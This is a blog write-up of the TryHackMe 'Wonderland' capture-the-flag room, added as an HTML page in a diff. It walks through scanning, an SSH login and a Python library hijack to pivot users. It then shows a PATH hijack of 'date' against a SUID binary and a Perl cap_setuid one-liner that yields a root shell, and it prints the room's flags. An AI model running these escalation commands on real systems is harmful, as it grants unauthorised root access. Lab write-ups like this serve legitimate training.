@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Alice in wonderland&amp;hellip;weirdest book I ever read as a kid and even more as an adult
+Let&amp;rsquo;s follow the rabbit
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn&#43;xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp&#43;E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA&#43;eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5&#43;h82rnWN| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=| 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF&#43;/hMyKh80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/wonderland/wonderland/" />
+
+
+    <title>
+        
+            Wonderland :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Wonderland">
+<meta itemprop="description" content="Alice in wonderland&hellip;weirdest book I ever read as a kid and even more as an adult
+Let&rsquo;s follow the rabbit
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn&#43;xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp&#43;E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA&#43;eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5&#43;h82rnWN| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=| 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF&#43;/hMyKh80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit."><meta itemprop="datePublished" content="2022-10-23T23:00:10+01:00" />
+<meta itemprop="dateModified" content="2022-10-23T23:00:10+01:00" />
+<meta itemprop="wordCount" content="1024"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Wonderland"/>
+<meta name="twitter:description" content="Alice in wonderland&hellip;weirdest book I ever read as a kid and even more as an adult
+Let&rsquo;s follow the rabbit
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn&#43;xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp&#43;E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA&#43;eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5&#43;h82rnWN| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=| 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF&#43;/hMyKh80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit."/>
+
+
+
+    <meta property="og:title" content="Wonderland" />
+<meta property="og:description" content="Alice in wonderland&hellip;weirdest book I ever read as a kid and even more as an adult
+Let&rsquo;s follow the rabbit
+Enumeration rustscan &#43; nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn&#43;xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp&#43;E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA&#43;eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5&#43;h82rnWN| 256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=| 256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF&#43;/hMyKh80/tcp open http syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)|_http-title: Follow the white rabbit." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/wonderland/wonderland/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-10-23T23:00:10+01:00" />
+<meta property="article:modified_time" content="2022-10-23T23:00:10+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-10-23 23:00:10 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/wonderland/wonderland/">Wonderland</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                
+    <img src="https://nair0lf32.github.io/zer0ne/thm/wonderland/alice.jpeg"  alt="alice"  class="left"  style="width: 200px;"  />
+
+
+<p>Alice in wonderland&hellip;weirdest book I ever read as a kid and even more as an adult</p>
+<p>Let&rsquo;s follow the rabbit</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="rustscan--nmap">rustscan + nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
+|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
+|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
+80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Follow the white rabbit.
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>                        [Status: 200, Size: 402, Words: 55, Lines: 10]
+img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
+index.html              [Status: 301, Size: 0, Words: 1, Lines: 1]
+r                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+</code></pre><p>&ldquo;r&rdquo; like rabbit&hellip;I see where it&rsquo;s going and I do not like it</p>
+<p>I did not have the patience to fuzz all that (I think I should) but hey its r/a/b/b/i/t</p>
+<p>aaaaand I hit the wall&hellip;now what?</p>
+<p>it says &ldquo;open the door&rdquo; and gives us directions that feel too much like a dead end</p>
+<p>I check the source (always) and find interresting credentials</p>
+<p><code>alice:fake_password_cause_it_wont_be_easy</code></p>
+<p>as SSH is open you know what to do</p>
+<h2 id="exploitation">Exploitation</h2>
+<pre tabindex="0"><code>alice@wonderland:~$ ls -al
+total 40
+drwxr-xr-x 5 alice alice 4096 May 25  2020 .
+drwxr-xr-x 6 root  root  4096 May 25  2020 ..
+lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
+-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
+drwx------ 2 alice alice 4096 May 25  2020 .cache
+drwx------ 3 alice alice 4096 May 25  2020 .gnupg
+drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
+-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
+-rw------- 1 root  root    66 May 25  2020 root.txt
+-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
+</code></pre><p>Lol&hellip;you obviously cannot read it</p>
+<pre tabindex="0"><code>alice@wonderland:~$ cat /root/user.txt
+thm{flag_for_wonderland_population}
+</code></pre><p>classic trickery</p>
+<pre tabindex="0"><code>alice@wonderland:~$ sudo -l
+[sudo] password for alice: 
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+</code></pre><p>I deduce from that we have to pivot to rabbit user using that python script</p>
+<pre tabindex="0"><code>alice@wonderland:~$ cat  walrus_and_the_carpenter.py
+import random
+poem = &#34;&#34;&#34;The sun was shining on the sea,
+
+...
+
+
+for i in range(10):
+    line = random.choice(poem.split(&#34;\n&#34;))
+    print(&#34;The line was:\t&#34;, line)
+</code></pre><p>that was a bit technical and needed some &ldquo;searching&rdquo;</p>
+<p>This was also the best part for me. You can actually hijack the path that python library due to the <code>import random</code></p>
+<pre tabindex="0"><code>alice@wonderland:~$ ls
+random.py  root.txt  walrus_and_the_carpenter.py
+alice@wonderland:~$ cat random.py
+import os
+os.system(&#34;/bin/bash&#34;)
+</code></pre><p>python will check the script folder before its own libraries folder, which is funny</p>
+<pre tabindex="0"><code>alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+[sudo] password for alice: 
+rabbit@wonderland:~$ id
+uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
+</code></pre><p>Finally! we caught that rabbit! still not root though</p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>The rabbit got a SUID binary in his home folder</p>
+<pre tabindex="0"><code>rabbit@wonderland:/home/rabbit$ ls -al
+total 40
+drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
+drwxr-xr-x 6 root   root    4096 May 25  2020 ..
+lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
+-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
+-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
+-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
+
+rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by Sun, 23 Oct 2022 19:46:28 +0000
+Ask very nicely, and I will give you some tea while you wait for him
+tea please
+Segmentation fault (core dumped)
+</code></pre><p>Interresting behaviour&hellip;binary analysis it is</p>
+<pre tabindex="0"><code>rabbit@wonderland:/home/rabbit$ which r2
+rabbit@wonderland:/home/rabbit$ which gdb
+</code></pre><p><a href="https://nair0lf32.github.io/zer0ne/thm/wonderland/teaParty">How can I work in these conditions?</a></p>
+<pre tabindex="0"><code>rabbit@wonderland:/home/rabbit$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.8.4.19 - - [23/Oct/2022 18:54:55] &#34;GET /teaParty HTTP/1.1&#34; 200 -
+</code></pre><pre tabindex="0"><code>└──╼ $wget http://10.10.190.164:8080/teaParty
+--2022-10-23 19:54:39--  http://10.10.190.164:8080/teaParty
+Connexion à 10.10.190.164:8080… connecté.
+requête HTTP transmise, en attente de la réponse… 200 OK
+Taille : 16816 (16K) [application/octet-stream]
+Sauvegarde en : « teaParty »
+
+teaParty                                                   100%[========================================================================================================================================&gt;]  16,42K  2,08KB/s    ds 7,9s    
+
+2022-10-23 19:54:49 (2,08 KB/s) — « teaParty » sauvegardé [16816/16816]
+</code></pre><pre tabindex="0"><code>│           0x55795772918d      488d3d740e00.  lea rdi, str.Welcome_to_the_tea_party__nThe_Mad_Hatter_will_be_here_soon. ; 0x55795772a008 ; &#34;Welcome to the tea party!\nThe Mad Hatter will be here soon.&#34;
+│           0x557957729194      e897feffff     call sym.imp.puts       ; int puts(const char *s)
+│           0x557957729199      488d3da80e00.  lea rdi, str._bin_echo__n_Probably_by___date___datenext_hour__R ; 0x55795772a048 ; &#34;/bin/echo -n &#39;Probably by &#39; &amp;&amp; date --date=&#39;next hour&#39; -R&#34;
+│           0x5579577291a0      e89bfeffff     call sym.imp.system     ; int system(const char *string)
+│           0x5579577291a5      488d3ddc0e00.  lea rdi, str.Ask_very_nicely__and_I_will_give_you_some_tea_while_you_wait_for_him ; 0x55795772a088 ; &#34;Ask very nicely, and I will give you some tea while you wait for him&#34;
+│           0x5579577291ac      e87ffeffff     call sym.imp.puts       ; int puts(const char *s)
+│           0x5579577291b1      e89afeffff     call sym.imp.getchar    ; int getchar(void)
+│           0x5579577291b6      488d3d130f00.  lea rdi, str.Segmentation_fault__core_dumped_ ; 0x55795772a0d0 ; &#34;Segmentation fault (core dumped)&#34;
+</code></pre><p>Basically the interresting part is <code> &quot;/bin/echo -n 'Probably by ' &amp;&amp; date --date='next hour' -R&quot;</code>. the <code>date</code> library path can also be hijacked just like we did in python</p>
+<p>Also faking a segfault&hellip;that&rsquo;s so evil I should note it down! who even do that??</p>
+<pre tabindex="0"><code>rabbit@wonderland:/home/rabbit$ echo &#34;/bin/bash&#34; &gt; date
+rabbit@wonderland:/home/rabbit$ chmod 777 date
+rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
+rabbit@wonderland:/home/rabbit$ ./teaParty
+Welcome to the tea party!
+The Mad Hatter will be here soon.
+Probably by hatter@wonderland:/home/rabbit$ id
+uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
+</code></pre><p>Oh look he came! (lol)</p>
+<pre tabindex="0"><code>hatter@wonderland:/home/rabbit$ cd /home/hatter
+hatter@wonderland:/home/hatter$ ls -al
+total 28
+drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
+drwxr-xr-x 6 root   root   4096 May 25  2020 ..
+lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
+-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
+drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
+-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
+-rw------- 1 hatter hatter   29 May 25  2020 password.txt
+hatter@wonderland:/home/hatter$ cat password.txt
+password_for_sane_people
+</code></pre><p>Yeah! more enumeration&hellip;MORE!!</p>
+<pre tabindex="0"><code>hatter@wonderland:~$ getcap -r / 2&gt;/dev/null
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+</code></pre><p>perl? okay let&rsquo;s ask gtfobins</p>
+<pre tabindex="0"><code>hatter@wonderland:~$ perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/sh&#34;;&#39;
+# id
+uid=0(root) gid=1003(hatter) groups=1003(hatter)
+</code></pre><p>it said yes</p>
+<pre tabindex="0"><code># cd /home/alice
+# ls
+random.py  root.txt  walrus_and_the_carpenter.py
+# cat root.txt
+thm{the_shech_sheshire_cheshirre_that_fat_cat_is_creepy}
+</code></pre><p>Weirdest CTF of my whole life!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
